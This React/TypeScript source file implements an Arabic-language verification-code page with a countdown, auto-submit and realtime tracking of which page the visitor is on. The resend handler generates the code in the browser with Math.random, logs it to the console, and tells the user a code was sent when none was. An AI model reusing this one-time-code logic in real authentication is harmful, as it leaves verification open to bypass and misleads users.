import { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { Shield, Lock, AlertCircle, CheckCircle2, Loader2 } from 'lucide-react';
import { useSiteConfig } from '@/context/SiteConfigContext';
import { verifyCode, createVerificationCode } from '@/lib/firestore';
import { setUserOnline, setUserOffline, updateUserPage } from '@/lib/realtime-presence';

export default function VerifyPage() {
  const navigate = useNavigate();
  const { config } = useSiteConfig();
  const pg = config.verify;
  
  const [code, setCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes
  const inputRef = useRef<HTMLInputElement>(null);
  
  const userId = sessionStorage.getItem('reg_id');
  const userEmail = sessionStorage.getItem('reg_email');

  // Set user online on mount
  useEffect(() => {
    if (!userId) {
      navigate('/register');
      return;
    }
    
    const clientId = sessionStorage.getItem('client_id') || '';
    setUserOnline(clientId, '/verify');
    
    return () => {
      setUserOffline(clientId);
    };
  }, [userId, navigate]);

  // Countdown timer
  useEffect(() => {
    if (timeLeft <= 0) return;
    
    const timer = setInterval(() => {
      setTimeLeft(prev => prev - 1);
    }, 1000);
    
    return () => clearInterval(timer);
  }, [timeLeft]);

  // Focus input on mount
  useEffect(() => {
    inputRef.current?.focus();
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!code || code.length < 6) {
      setError('يرجى إدخال رمز التحقق المكون من 6 أرقام');
      return;
    }

    setLoading(true);
    setError('');

    try {
      if (!userId) {
        throw new Error('معرف المستخدم غير موجود');
      }

      const isValid = await verifyCode(userId, code);
      
      if (isValid) {
        setSuccess(true);
        
        // Update presence
        const clientId = sessionStorage.getItem('client_id') || '';
        updateUserPage(clientId, '/thank-you');
        
        // Navigate after short delay
        setTimeout(() => {
          navigate('/thank-you');
        }, 1500);
      } else {
        setError('رمز التحقق غير صحيح أو منتهي الصلاحية');
        setCode('');
        inputRef.current?.focus();
      }
    } catch (err: any) {
      console.error('Verification error:', err);
      setError(err.message || 'حدث خطأ أثناء التحقق');
    } finally {
      setLoading(false);
    }
  };

  const handleResend = async () => {
    if (!userId) return;
    
    setLoading(true);
    setError('');
    
    try {
      // Generate new 6-digit code
      const newCode = Math.floor(100000 + Math.random() * 900000).toString();
      
      await createVerificationCode(userId, newCode, 5);
      
      // Reset timer
      setTimeLeft(300);
      setCode('');
      setError('');
      
      // In production, you would send this code via SMS/Email
      console.log('[Verify] New code generated (in production, send via SMS):', newCode);
      
      alert('تم إرسال رمز جديد بنجاح');
    } catch (err: any) {
      console.error('Resend error:', err);
      setError('فشل إرسال رمز جديد. حاول مرة أخرى.');
    } finally {
      setLoading(false);
    }
  };

  // Auto-submit when 6 digits entered
  useEffect(() => {
    if (code.length === 6) {
      handleSubmit({ preventDefault: () => {} } as any);
    }
  }, [code]);

  if (!userId) {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4">
        <div className="text-center">
          <AlertCircle className="w-16 h-16 text-red-500 mx-auto mb-4" />
          <h2 className="text-xl font-bold text-white mb-2">خطأ</h2>
          <p className="text-slate-400 mb-4">يرجى التسجيل أولاً</p>
          <button
            onClick={() => navigate('/register')}
            className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-6 rounded-xl"
          >
            تسجيل جديد
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        {/* Logo & Title */}
        <div className="text-center mb-8">
          <div className="w-20 h-20 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-2xl shadow-blue-600/30">
            <Shield className="w-10 h-10 text-white" />
          </div>
          <h1 className="text-3xl font-bold text-white mb-2">{pg.title}</h1>
          <p className="text-slate-400">
            تم إرسال رمز التحقق إلى<br />
            <span className="text-blue-400 font-semibold">{userEmail}</span>
          </p>
        </div>

        {/* Verification Form */}
        <div className="bg-slate-800/50 backdrop-blur-xl rounded-3xl p-8 shadow-2xl border border-slate-700/50">
          {success ? (
            <div className="text-center py-8">
              <div className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
                <CheckCircle2 className="w-10 h-10 text-green-500" />
              </div>
              <h2 className="text-xl font-bold text-white mb-2">تم التحقق بنجاح!</h2>
              <p className="text-slate-400">جاري التحويل إلى الصفحة الرئيسية...</p>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Code Input */}
              <div className="space-y-3">
                <label className="text-sm font-semibold text-slate-300 flex items-center gap-2">
                  <Lock className="w-4 h-4" />
                  رمز التحقق
                </label>
                <input
                  ref={inputRef}
                  type="text"
                  value={code}
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, '').slice(0, 6);
                    setCode(val);
                    setError('');
                  }}
                  placeholder="000000"
                  dir="ltr"
                  className="w-full bg-slate-900/50 border border-slate-600 rounded-xl px-4 py-4 text-center text-3xl tracking-[1em] font-mono text-white placeholder-slate-600 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 focus:outline-none transition-all"
                  disabled={loading}
                  maxLength={6}
                />
                <p className="text-center text-sm text-slate-500">
                  متبقي: <span className={`font-bold ${timeLeft <= 60 ? 'text-red-400' : 'text-slate-400'}`}>{formatTime(timeLeft)}</span>
                </p>
              </div>

              {/* Error Message */}
              {error && (
                <div className="flex items-center gap-2 bg-red-500/10 border border-red-500/20 rounded-xl px-4 py-3 text-red-400 text-sm">
                  <AlertCircle className="w-5 h-5 flex-shrink-0" />
                  <span>{error}</span>
                </div>
              )}

              {/* Submit Button */}
              <button
                type="submit"
                disabled={loading || code.length < 6}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-blue-600/50 text-white font-bold py-4 rounded-xl shadow-lg shadow-blue-600/30 hover:shadow-xl hover:shadow-blue-600/40 transform hover:-translate-y-0.5 transition-all flex items-center justify-center gap-2"
              >
                {loading ? (
                  <>
                    <Loader2 className="w-5 h-5 animate-spin" />
                    <span>جاري التحقق...</span>
                  </>
                ) : (
                  <>
                    <span>{pg.button_text}</span>
                    <Shield className="w-5 h-5" />
                  </>
                )}
              </button>

              {/* Resend Link */}
              <div className="text-center">
                <button
                  type="button"
                  onClick={handleResend}
                  disabled={loading || timeLeft > 240}
                  className="text-blue-400 hover:text-blue-300 text-sm font-medium disabled:text-slate-600 disabled:cursor-not-allowed transition-colors"
                >
                  {pg.resend_text}
                </button>
              </div>
            </form>
          )}
        </div>

        {/* Back Link */}
        <div className="text-center mt-6">
          <button
            onClick={() => navigate('/login')}
            className="text-slate-500 hover:text-slate-400 text-sm transition-colors"
          >
            ← العودة لتسجيل الدخول
          </button>
        </div>
      </div>
    </div>
  );
}
